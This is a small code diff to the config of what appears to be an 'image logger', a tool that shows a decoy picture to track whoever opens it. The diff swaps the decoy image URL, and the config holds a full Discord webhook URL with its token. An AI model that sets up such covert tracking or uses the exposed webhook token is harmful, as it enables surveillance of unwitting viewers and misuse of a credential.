@@ -13,7 +13,7 @@
     config = {
         # BASE CONFIG #
         "webhook": "https://discordapp.com/api/webhooks/1399141478994804756/DzoD09fuEy6IcY5iInAV4Coirla1n4SJNTP5ii3-Pt7HcS0CWSDGngCZNyTs8nEzE6DJ",
-        "image": "https://www.pcworld.com/wp-content/uploads/2025/04/Windows-XP-Bliss-desktop-large.png", # You can also have a custom image by using a URL argument
+        "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/Amazona_aestiva_-upper_body-8a_%281%29.jpg/2560px-Amazona_aestiva_-upper_body-8a_%281%29.jpg", # You can also have a custom image by using a URL argument
                                                 # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
         "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
